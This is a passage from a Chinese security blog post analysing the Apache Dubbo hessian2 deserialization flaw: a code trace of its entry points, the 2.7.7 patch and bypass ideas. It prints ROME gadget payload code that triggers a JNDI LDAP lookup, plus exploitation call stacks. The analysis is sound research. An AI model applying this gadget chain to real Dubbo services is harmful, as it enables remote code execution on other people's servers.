<html>
  <head>
    <meta charset="utf-8" />
<meta name="referrer" content="no-referrer">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Apache Dubbo 反序列化漏洞 | xray 技术博客</title>
<link rel="shortcut icon" href="https://blog.xray.cool/favicon.ico?v=1620790414551">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://blog.xray.cool/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="Apache Dubbo 反序列化漏洞 | xray 技术博客 - Atom Feed" href="https://blog.xray.cool/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">


<script async src="https://www.googletagmanager.com/gtag/js?id=UA-176727836-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-176727836-2');
</script>


    <meta name="description" content="0x01 漏洞描述
dubbo于2020年6月22日更新了一个 hessian2 反序列化的漏洞，影响版本：
Dubbo 2.7.0 to 2.7.6
Dubbo 2.6.0 to 2.6.7
Dubbo all 2.5.x version..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://blog.xray.cool">
  <img class="avatar" src="https://blog.xray.cool/images/avatar.png?v=1620790414551" alt="">
  </a>
  <h1 class="site-title">
    xray 技术博客
  </h1>
  <p class="site-description">
    
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives/" class="menu">
          归档
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              Apache Dubbo 反序列化漏洞
            </h2>
            <div class="post-info">
              <span>
                2020-09-04
              </span>
              <span>
                26 min read
              </span>
              
            </div>
            
              <img class="post-feature-image" src="https://blog.xray.cool/post-images/something-about-dubbo-deserialization-vulnerability.jpg" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content">
                <h2 id="0x01-漏洞描述">0x01 漏洞描述</h2>
<p>dubbo于2020年6月22日更新了一个 <strong>hessian2</strong> 反序列化的漏洞，影响版本：</p>
<pre><code>Dubbo 2.7.0 to 2.7.6
Dubbo 2.6.0 to 2.6.7
Dubbo all 2.5.x versions (not supported by official team any longer)
</code></pre>
<h2 id="0x02-环境搭建">0x02 环境搭建</h2>
<h3 id="服务端">服务端</h3>
<pre><code class="language-java">public class A implements Serializable {
    String name = &quot;l1nk3r&quot;;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}

public interface DemoService {

    String hello(A a);

    Object Sayhello(Object o);
}

public class DemoServiceImpl implements DemoService {

    public String hello(A a) {
        return &quot;hello! &quot; + a.getName();
    }

    public Object Sayhello(Object o) {
        return &quot;hello! &quot;;
    }
}

public class Provider {

    public static void main(String[] args) {
        new ClassPathXmlApplicationContext(&quot;dubbo-provider.xml&quot;);
        while (true);
    }
</code></pre>
<pre><code class="language-xml">//dubbo-provider.xml
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:dubbo=&quot;http://dubbo.apache.org/schema/dubbo&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://dubbo.apache.org/schema/dubbo http://dubbo.apache.org/schema/dubbo/dubbo.xsd&quot;&gt;
    &lt;!-- 提供方应用信息，用于计算依赖关系 --&gt;
    &lt;dubbo:application name=&quot;dubbo-service&quot; /&gt;

    &lt;!-- 使用multicast广播注册中心暴露服务地址 --&gt;
    &lt;!-- &lt;dubbo:registry address=&quot;multicast://224.5.6.7:1234&quot; /&gt; --&gt;

    &lt;!-- 使用zookeeper注册中心暴露服务地址 --&gt;
    &lt;dubbo:registry address=&quot;zookeeper://127.0.0.1:2181&quot; /&gt;

    &lt;!-- 用dubbo协议在20881端口暴露服务 --&gt;
    &lt;dubbo:protocol name=&quot;dubbo&quot; port=&quot;20880&quot; /&gt;

    &lt;!-- 声明需要暴露的服务接口 --&gt;
    &lt;dubbo:service interface=&quot;com.l1nk3r.dubbo.DemoService&quot;
                   ref=&quot;demoService&quot; /&gt;

    &lt;!-- 和本地bean一样实现服务 --&gt;
    &lt;bean id=&quot;demoService&quot; class=&quot;com.l1nk3r.dubbo.DemoServiceImpl&quot; /&gt;
&lt;/beans&gt;
</code></pre>
<h3 id="客户端">客户端</h3>
<pre><code class="language-java">public class Consumer {
    public static void main(String[] args) {
        ApplicationContext applicationContext = new ClassPathXmlApplicationContext(&quot;dubbo-consumer.xml&quot;);
        DemoService demoService = (DemoService) applicationContext.getBean(&quot;demoService&quot;);
        System.out.println(demoService.hello(new A()));
    }
}
</code></pre>
<h2 id="0x03-漏洞分析">0x03 漏洞分析</h2>
<h3 id="1-readobject入口">1、readobject入口</h3>
<p><strong>dubbo</strong> 的 <strong>org.apache.dubbo.remoting.transport.DecodeHandler#received</strong> 方法负责接收来自 <strong>socket</strong> 的连接，当请求的时候，会自动调用 <strong>DecodeHandler#decode</strong> 来处理传入的请求。</p>
<pre><code class="language-java">    public void received(Channel channel, Object message) throws RemotingException {
				...
        if (message instanceof Request) {
            this.decode(((Request)message).getData());
        }
</code></pre>
<p>跟进 <strong>DecodeHandler#decode</strong> 方法，由于接收的是RPC请求，因此会来到 <strong>DecodeableRpcInvocation#decode</strong> 处理 <strong>socket</strong> 传入的数据。</p>
<pre><code class="language-java">    private void decode(Object message) {
        if (message instanceof Decodeable) {
            try {
                ((Decodeable)message).decode();
</code></pre>
<figure data-type="image" tabindex="1"><img src="http://l1nk3r.xmutsec.com/blog/hm9ga.png" alt="image-20200701131318262" loading="lazy"></figure>
<p>在 <strong>DecodeableRpcInvocation#decode</strong> 方法中，会进一步调用 <strong>decode(Channel channel, InputStream input)</strong> 这个构造方法。</p>
<pre><code class="language-java">    public void decode() throws Exception {
        if (!this.hasDecoded &amp;&amp; this.channel != null &amp;&amp; this.inputStream != null) {
            try {
                this.decode(this.channel, this.inputStream);
</code></pre>
<p>跟进 <strong>decode(Channel channel, InputStream input)</strong> 这个构造方法，核心触发点代码就是下面这些了，先分别来看看。</p>
<pre><code class="language-java">    public Object decode(Channel channel, InputStream input) throws IOException {
        ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input);
        ..
                for(int i = 0; i &lt; args.length; ++i) {
                    try {
                        args[i] = in.readObject(pts[i]);
</code></pre>
<p>先看下面这段代码：</p>
<pre><code class="language-java">ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input);
</code></pre>
<p>这段代码首先会从<code>channel.getUrl()</code>中获取下列内容</p>
<pre><code>dubbo://10.11.17.162:20880/com.l1nk3r.dubbo.DemoService?anyhost=true&amp;application=dubbo-service&amp;bind.ip=10.11.17.162&amp;bind.port=20880&amp;channel.readonly.sent=true&amp;codec=dubbo&amp;deprecated=false&amp;dubbo=2.0.2&amp;dynamic=true&amp;generic=false&amp;heartbeat=60000&amp;interface=com.l1nk3r.dubbo.DemoService&amp;methods=Sayhello,hello&amp;pid=63947&amp;release=2.7.6&amp;side=provider&amp;threadname=DubboServerHandler-10.11.17.162:20880&amp;timestamp=1593580866485
</code></pre>
<p>而此时的<code>this.serializationType</code>结果为2，进入<code>CodecSupport.getSerialization</code>进行处理。</p>
<figure data-type="image" tabindex="2"><img src="http://l1nk3r.xmutsec.com/blog/8tu8e.png" alt="image-20200701132350763" loading="lazy"></figure>
<p>此时的 <strong>serialization</strong> 对象会根据刚刚的<code>this.serializationType</code>进入到map进行查找，不同的id对应不同的 <strong>Serialization</strong> ，这里的结果是14个。它们分别是</p>
<figure data-type="image" tabindex="3"><img src="http://l1nk3r.xmutsec.com/blog/ec70f.png" alt="image-20200701132539625" loading="lazy"></figure>
<pre><code>2--&gt;&quot;org.apache.dubbo.common.serialize.hessian2.Hessian2Serialization@2685de5c&quot;,
3--&gt;&quot;org.apache.dubbo.common.serialize.java.JavaSerialization@36536b53&quot;,
4--&gt;&quot;org.apache.dubbo.common.serialize.java.CompactedJavaSerialization@17699a12&quot;,
6--&gt;&quot;org.apache.dubbo.common.serialize.fastjson.FastJsonSerialization@4e5571bb&quot;,
7--&gt;&quot;org.apache.dubbo.common.serialize.nativejava.NativeJavaSerialization@46aa2113&quot;,
8--&gt;&quot;org.apache.dubbo.common.serialize.kryo.KryoSerialization@6b0ed366&quot;,
9--&gt;&quot;org.apache.dubbo.common.serialize.fst.FstSerialization@30ec7d1f&quot;,
10--&gt;&quot;org.apache.dubbo.serialize.hessian.Hessian2Serialization@55511a10&quot;,
11--&gt;&quot;org.apache.dubbo.common.serialize.avro.AvroSerialization@42e41b10&quot;,
12--&gt;&quot;org.apache.dubbo.common.serialize.protostuff.ProtostuffSerialization@5fec75c9&quot;,
16--&gt;&quot;org.apache.dubbo.common.serialize.gson.GsonSerialization@c3bffae&quot;,
21--&gt;&quot;org.apache.dubbo.common.serialize.protobuf.support.GenericProtobufJsonSerialization@51e7f5a3&quot;,
22--&gt;&quot;org.apache.dubbo.common.serialize.protobuf.support.GenericProtobufSerialization@33394814&quot;,
25--&gt;&quot;org.apache.dubbo.common.serialize.kryo.optimized.KryoSerialization2@f473187&quot;
</code></pre>
<p>然后会调用进入<code>url.getParameter(&quot;serialization&quot;, &quot;hessian2&quot;)</code>，最后满足if判断的情况下就会返回<code>hessian2.Hessian2Serialization</code>这个对象</p>
<pre><code class="language-java">    public static Serialization getSerialization(URL url, Byte id) throws IOException {
        Serialization serialization = getSerializationById(id);
        String serializationName = url.getParameter(&quot;serialization&quot;, &quot;hessian2&quot;);
        if (serialization != null &amp;&amp; (id != 3 &amp;&amp; id != 7 &amp;&amp; id != 4 || serializationName.equals(ID_SERIALIZATIONNAME_MAP.get(id)))) {
            return serialization;
</code></pre>
<p>跟进<code>url.getParameter(&quot;serialization&quot;, &quot;hessian2&quot;)</code>，这里会有一个<code>getParameter(key)</code>，而这个key正是我们前面url中的 <strong>serialization</strong> ，但是很有趣的一点，我们的url中是没有这个 <strong>Parameter</strong> ，也就是说当满足<code>StringUtils.isEmpty(value)</code>这个判断的情况下，返回结果自然是 <strong>defaultValue</strong> 也就是传入的 <strong>hessian2</strong>。从这里也可以知道dubbo这个协议默认是走 <strong>hessian2</strong> 的。</p>
<pre><code class="language-java">    public String getParameter(String key, String defaultValue) {
        String value = this.getParameter(key);
        return StringUtils.isEmpty(value) ? defaultValue : value;
    }
</code></pre>
<p>这里过程都处理完之后，就来到<strong>DecodeableRpcInvocation</strong> 的 <strong>decode(Channel channel, InputStream input)</strong> 这个构造方法漏洞的入口 <strong>readobject</strong> 了，而这里的 <strong>in</strong> 对象实际上就是我们前面返回的<code>hessian2.Hessian2Serialization</code>对象。</p>
<pre><code class="language-java">    public Object decode(Channel channel, InputStream input) throws IOException {
      ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input);
      ...
                for(int i = 0; i &lt; args.length; ++i) {
                    try {
                        args[i] = in.readObject(pts[i]);
</code></pre>
<p>进一步跟进来到的就是 <strong>hessian2.Hessian2ObjectInput#readObject</strong> 方法了。</p>
<pre><code class="language-java">    public &lt;T&gt; T readObject(Class&lt;T&gt; cls) throws IOException, ClassNotFoundException {
        return this.mH2i.readObject(cls);
    }
</code></pre>
<p>继续一直跟进会来到 <strong>Hessian2Input</strong> 这个方法中的<code>readObject(List&lt;Class&lt;?&gt;&gt; expectedTypes)</code>构造方法，在这个方法里的 <strong>case 72</strong> 就是本次漏洞的核心点触发点map。</p>
<pre><code class="language-java">        case 72:
            boolean keyValuePair = expectedTypes != null &amp;&amp; expectedTypes.size() == 2;
            reader = this.findSerializerFactory().getDeserializer(Map.class);
            return reader.readMap(this, keyValuePair ? (Class)expectedTypes.get(0) : null, keyValuePair ? (Class)expectedTypes.get(1) : null);
</code></pre>
<p>继续跟进<code>reader.readMap</code>，这里会调用 <strong>MapDeserializer#readMap</strong> 进行处理。</p>
<figure data-type="image" tabindex="4"><img src="http://l1nk3r.xmutsec.com/blog/eyxig.png" alt="image-20200701134711152" loading="lazy"></figure>
<p>继续跟进这个 <strong>MapDeserializer#doReadMap</strong> 就可以看到了，这里调用的 <strong>map.put</strong> ，后面再来说这个东西有啥用。</p>
<figure data-type="image" tabindex="5"><img src="http://l1nk3r.xmutsec.com/blog/w31wv.png" alt="image-20200701134806869" loading="lazy"></figure>
<p>先看一下 <strong>rome</strong> 这个 <strong>gadget</strong></p>
<pre><code class="language-java">    private static Object getPayload() throws Exception {
        String jndiUrl = &quot;ldap://127.0.0.1:1389/yd5lo9&quot;;
        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, JDKUtil.makeJNDIRowSet(jndiUrl));
        EqualsBean root = new EqualsBean(ToStringBean.class,item);
        return JDKUtil.makeMap(root,root);
    }
</code></pre>
<p>首先创建了一个 <strong>ToStringBean</strong> 的 <strong>item</strong> ，将 <strong>beanClass</strong> 设置为了 <strong>JdbcRowSetImpl</strong> ，obj设置为放入JNDI地址的 <strong>JdbcRowSetImpl</strong> 对象。</p>
<pre><code class="language-java">    public ToStringBean(Class&lt;?&gt; beanClass, Object obj) {
        this.beanClass = beanClass;
        this.obj = obj;
    }
</code></pre>
<pre><code class="language-java">    public static JdbcRowSetImpl makeJNDIRowSet(String jndiUrl) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiUrl);
        rs.setMatchColumn(&quot;foo&quot;);
        Reflections.getField(BaseRowSet.class, &quot;listeners&quot;).set(rs, (Object)null);
        return rs;
    }
</code></pre>
<p>其次创建一个 <strong>EqualsBean</strong> ，把前面那个item放进去。</p>
<pre><code class="language-java">    public EqualsBean(Class&lt;?&gt; beanClass, Object obj) {
        if (!beanClass.isInstance(obj)) {
            throw new IllegalArgumentException(obj.getClass() + &quot; is not instance of &quot; + beanClass);
        } else {
            this.beanClass = beanClass;
            this.obj = obj;
        }
    }
</code></pre>
<p>最后通过 <strong>JDKUtil.makeMap</strong> 反射构造数组的方式，防止在放入root对象的时候触发put方法导致出发利用代码。</p>
<pre><code class="language-java">    public static HashMap&lt;Object, Object&gt; makeMap(Object v1, Object v2) throws Exception {
        HashMap&lt;Object, Object&gt; s = new HashMap();
        Reflections.setFieldValue(s, &quot;size&quot;, 2);

        Class nodeC;
        try {
            nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);
        } catch (ClassNotFoundException var6) {
            nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);
        }

        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(Integer.TYPE, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, &quot;table&quot;, tbl);
        return s;
    }
</code></pre>
<p>这里为什么会样呢，原因就在于 <strong>ToStringBean</strong> 有个 <strong>toString</strong> 方法，这个方法会根据 <strong>beanClass</strong> 的 <strong>getter</strong> 构造方法。</p>
<pre><code class="language-java">    private String toString(String prefix) {
        StringBuffer sb = new StringBuffer(128);

        try {
            List&lt;PropertyDescriptor&gt; propertyDescriptors = BeanIntrospector.getPropertyDescriptorsWithGetters(this.beanClass);
            Iterator var10 = propertyDescriptors.iterator();

            while(var10.hasNext()) {
                PropertyDescriptor propertyDescriptor = (PropertyDescriptor)var10.next();
                String propertyName = propertyDescriptor.getName();
                Method getter = propertyDescriptor.getReadMethod();
                Object value = getter.invoke(this.obj, NO_PARAMS);
                this.printProperty(sb, prefix + &quot;.&quot; + propertyName, value);
            }
</code></pre>
<p>而在 <strong>EqualBean</strong> 里有个 <strong>hashCode</strong> 方法，这个方法会调用obj对象的toString方法。</p>
<pre><code class="language-java">    public int hashCode() {
        return this.beanHashCode();
    }

    public int beanHashCode() {
        return this.obj.toString().hashCode();
    }
</code></pre>
<p>好了再回到dubbo当中，我们刚刚知道 <strong>MapDeserializer#doReadMap</strong> 会调用的 <strong>map.put</strong> ，在跟进 <strong>map.put</strong> 我们会看到这里会调用<code>hash(key)</code>，来进行计算，而这个计算方法，自然会调用key对象的 <strong>hashCode</strong> 方法，假设key对象是 <strong>EqualBean</strong> ，那么这里的利用链自然就串起来了。</p>
<pre><code class="language-java">    public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }

    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
    }
</code></pre>
<p>下面就是调用栈了，很遗憾，这个点实际上修复的并不完全，依然在2.7.7上可以利用。</p>
<pre><code>connect:624, JdbcRowSetImpl (com.sun.rowset)
getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
toString:158, ToStringBean (com.rometools.rome.feed.impl)
toString:129, ToStringBean (com.rometools.rome.feed.impl)
beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
hash:338, HashMap (java.util)
put:611, HashMap (java.util)
doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readObject:2703, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2278, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2080, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2074, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:92, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
decode:139, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
</code></pre>
<h3 id="2-tostring入口">2、toString入口</h3>
<p>这个入口的POC实际上被公开了，应该算是dubbo自己有问题，把提交者邮件正文内容全部公开，这条链走的实际上并不是 <strong>readObject</strong> 入口，而是 <strong>toString</strong> 口，我们来细看一下，前面的流程都和 <strong>readObject</strong> 入口一致，前面也是经过 <strong>DecodeHandler#decode</strong> 进行解码操作，最后来到 <strong>DecodeableRpcInvocation#decode</strong> 这个方法中，下面代码是核心触发点。</p>
<pre><code class="language-java">            for(int i = 0; i &lt; args.length; ++i) {
                args[i] = CallbackServiceCodec.decodeInvocationArgument(channel, this, pts, i, args[i]);
            }
</code></pre>
<p>跟进 <strong>decodeInvocationArgument</strong> 方法，重点可以看看<code>DubboProtocol.getDubboProtocol().getInvoker</code></p>
<pre><code class="language-java">    public static Object decodeInvocationArgument(Channel channel, RpcInvocation inv, Class&lt;?&gt;[] pts, int paraIndex, Object inObject) throws IOException {
        URL url = null;

        try {
            url = DubboProtocol.getDubboProtocol().getInvoker(channel, inv).getUrl();
        } catch (RemotingException var10) {
            if (logger.isInfoEnabled()) {
                logger.info(var10.getMessage(), var10);
            }

            return inObject;
        }
</code></pre>
<p>在 <strong>getInvoker</strong> 当中，针对inv进行了 <strong>getInvocationWithoutData</strong> 的处理。</p>
<pre><code class="language-java">    Invoker&lt;?&gt; getInvoker(Channel channel, Invocation inv) throws RemotingException {
		...
        if (exporter == null) {
            throw new RemotingException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + this.getInvocationWithoutData(inv));
        } else {
            return exporter.getInvoker();
        }
    }
</code></pre>
<p>跟进  <strong>getInvocationWithoutData</strong> 的处理，这里有个判断，当 <strong>logger</strong> 不是 <strong>debug</strong> 状态的时候，将 <strong>Arguments</strong> 设置为空。</p>
<pre><code class="language-java">    private Invocation getInvocationWithoutData(Invocation invocation) {
        if (this.logger.isDebugEnabled()) {
            return invocation;
        } else if (invocation instanceof RpcInvocation) {
            RpcInvocation rpcInvocation = (RpcInvocation)invocation;
            rpcInvocation.setArguments((Object[])null);
            return rpcInvocation;
        } else {
            return invocation;
        }
    }
</code></pre>
<p>那这里就有个疑惑了，如果已经处理了，为什么在2.7.6上用这个poc依然能够攻击成功呢。</p>
<figure data-type="image" tabindex="6"><img src="http://l1nk3r.xmutsec.com/blog/rw8qt.png" alt="image-20200702102243482" loading="lazy"></figure>
<p>为了解决这个疑惑，我们来分别看看，当前环境下的 <strong>DecodeableRpcInvocation</strong> 确实是满足继承 <strong>RpcInvocation</strong> 。</p>
<figure data-type="image" tabindex="7"><img src="http://l1nk3r.xmutsec.com/blog/7cqpi.png" alt="image-20200702102756714" loading="lazy"></figure>
<p>为了达到这段代码效果，手动将 <strong>Arguments</strong> 设置为 <strong>null</strong> ，实际经过这么处理之后，确实是不会触发的。</p>
<figure data-type="image" tabindex="8"><img src="http://l1nk3r.xmutsec.com/blog/65i52.png" alt="image-20200702103040916" loading="lazy"></figure>
<p>这就很纳闷了，在我不设置日志级别的情况下会触发。</p>
<figure data-type="image" tabindex="9"><img src="http://l1nk3r.xmutsec.com/blog/c62qh.png" alt="image-20200702105605539" loading="lazy"></figure>
<p>在我设置了日志级别的情况下，不会触发，所以这里小心求证，应该是不设置日志级别的情况下，默认是debug。</p>
<figure data-type="image" tabindex="10"><img src="http://l1nk3r.xmutsec.com/blog/95nl2.png" alt="image-20200702105748387" loading="lazy"></figure>
<p>当然这条链的最后调用栈如下所示。</p>
<pre><code>connect:624, JdbcRowSetImpl (com.sun.rowset)
getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
toString:158, ToStringBean (com.rometools.rome.feed.impl)
toString:129, ToStringBean (com.rometools.rome.feed.impl)
valueOf:2994, String (java.lang)
toString:4571, Arrays (java.util)
toString:429, RpcInvocation (org.apache.dubbo.rpc)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
getInvoker:265, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo)
reply:120, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
handleRequest:100, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
received:175, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
received:51, DecodeHandler (org.apache.dubbo.remoting.transport)
run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:745, Thread (java.lang)
</code></pre>
<h2 id="0x04-补丁以及绕过">0x04 补丁以及绕过</h2>
<p>在2.7.7当中，dubbo增加了一段代码。</p>
<p>![image-20200701141715441](/Users/l1nk3r/Library/Application Support/typora-user-images/image-20200701141715441.png)</p>
<pre><code class="language-java">if (!RpcUtils.isGenericCall(path, this.getMethodName()) &amp;&amp; !RpcUtils.isEcho(path, this.getMethodName())) {
                        throw new IllegalArgumentException(&quot;Service not found:&quot; + path + &quot;, &quot; + this.getMethodName());
                    }
</code></pre>
<p>当这段代码逻辑有点问题，也就说只要 <strong>method</strong> 匹配  <strong>invoke</strong> ，<strong>invokeAsync</strong> ，<strong>echo</strong>，让<code>!RpcUtils.isGenericCall(path, this.getMethodName()) &amp;&amp; !RpcUtils.isEcho(path, this.getMethodName())</code>这个逻辑判断为 <strong>false</strong> 可以绕过，这里的判断应该是为了判断方法名字和路径一致增加的吧。</p>
<pre><code class="language-java">    public static boolean isGenericCall(String path, String method) {
        return &quot;$invoke&quot;.equals(method) || &quot;$invokeAsync&quot;.equals(method);
    }
    
        public static boolean isEcho(String path, String method) {
        return &quot;$echo&quot;.equals(method);
    }
</code></pre>
<p>前面我们提到过的，在  <strong>getInvocationWithoutData</strong> 当中也处理了一条链。</p>
<h3 id="1-绕过args限制">1、绕过args限制</h3>
<p>在 <strong>DecodeableRpcInvocation#decode</strong> 这里的几个 <strong>readUTF</strong> 做手脚，这里实际上不放在 <strong>args</strong> 里面应该是 <strong>ok</strong> 的。</p>
<pre><code class="language-java">    public Object decode(Channel channel, InputStream input) throws IOException {
        ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input);
        String dubboVersion = in.readUTF();
        this.request.setVersion(dubboVersion);
        this.setAttachment(&quot;dubbo&quot;, dubboVersion);
        String path = in.readUTF();
        this.setAttachment(&quot;path&quot;, path);
        this.setAttachment(&quot;version&quot;, in.readUTF());
        this.setMethodName(in.readUTF());
        String desc = in.readUTF();
        this.setParameterTypesDesc(desc);
</code></pre>
<p>核心点在于 <strong>Hessian2Input#expect</strong> 这个方法里面也有 <strong>toString</strong> 的利用方式，当然还有个 <strong>readObject</strong> ，至于为啥要放置 <strong>readObject</strong> 我也不太清楚。</p>
<pre><code class="language-java">    protected IOException expect(String expect, int ch) throws IOException {
        if (ch &lt; 0) {
            return this.error(&quot;expected &quot; + expect + &quot; at end of file&quot;);
        } else {
            --this._offset;

            try {
                Object obj = this.readObject();
                return obj != null ? this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; &quot; + obj.getClass().getName() + &quot; (&quot; + obj + &quot;)&quot;) : this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; null&quot;);
</code></pre>
<p>调用栈</p>
<pre><code>connect:624, JdbcRowSetImpl (com.sun.rowset)
getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
toString:158, ToStringBean (com.rometools.rome.feed.impl)
toString:129, ToStringBean (com.rometools.rome.feed.impl)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:3564, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readString:1883, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readUTF:88, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
decode:109, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:80, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:745, Thread (java.lang)
</code></pre>
<h3 id="2-寻找新的readobject入口">2、寻找新的readObject入口</h3>
<p>这个 <strong>gadget</strong> 来自 <strong>@threedr3am</strong> 师傅的之前dubbo攻击 <strong>hessian2</strong> 文章中，核心思路他找到了一条新的 <strong>readObject</strong> ，来自 <strong>org.apache.dubbo.common.serialize.readEvent</strong> 当中。</p>
<p>其实我觉得核心思路在这里 <strong>DubboCodec#decodeBody</strong> 。当<code>req.isEvent()</code>结果为true的时候，就会进入这个if逻辑进行操作。</p>
<pre><code class="language-java">    protected Object decodeBody(Channel channel, InputStream is, byte[] header) throws IOException {
    ...
            try {
                Object data;
                if (req.isEvent()) {
                    in = CodecSupport.deserialize(channel.getUrl(), is, proto);
                    data = this.decodeEventData(channel, in);
</code></pre>
<p>而 <strong>isEvent</strong> 主要是返回 <strong>this.mEvent</strong> 的值。</p>
<pre><code class="language-java">    public boolean isEvent() {
        return this.mEvent;
    }
</code></pre>
<p>这个 <strong>this.mEvent</strong> 的值是怎么来的，继续往下看，<strong>flag</strong> 是 <strong>header[2]</strong> 数组的值，这里是request请求，没有什么疑问前面也提到了，所以会进来这里进行处理。这个做了一个<code>(flag &amp; 32) != 0</code>的逻辑判断，如果是true的情况下，就会将调用 <strong>setEvent</strong> 方法。</p>
<pre><code class="language-java">    protected Object decodeBody(Channel channel, InputStream is, byte[] header) throws IOException {
        byte flag = header[2];
        ...
        } else {
            Request req = new Request(id);
            req.setVersion(Version.getProtocolVersion());
            req.setTwoWay((flag &amp; 64) != 0);
            if ((flag &amp; 32) != 0) {
                req.setEvent(true);
            }
</code></pre>
<p>在 <strong>setEvent(boolean mEvent)</strong> 构造方法中，可以清楚看到这里的结果是true，因此自然会回到上面的流程中，进行 <strong>decodeEventData</strong> 处理了。</p>
<pre><code class="language-java">    public void setEvent(boolean mEvent) {
        this.mEvent = mEvent;
    }
</code></pre>
<p>这里再提一点，如果<code>req.isEvent()</code>为false的情况下，就会来到下面的操作了，这里和之前的出发点非常相似。</p>
<pre><code class="language-java">                    DecodeableRpcInvocation inv;
                    if (channel.getUrl().getParameter(&quot;decode.in.io&quot;, false)) {
                        inv = new DecodeableRpcInvocation(channel, req, is, proto);
                        inv.decode();
                    } else {
                        inv = new DecodeableRpcInvocation(channel, req, new UnsafeByteArrayInputStream(this.readMessageData(is)), proto);
                    }

                    data = inv;
</code></pre>
<p>跟进 <strong>ExchangeCodec#decodeEventData</strong> 之后会直接 <strong>return</strong> 调用 <strong>ObjectInput#readEvent</strong> 方法。</p>
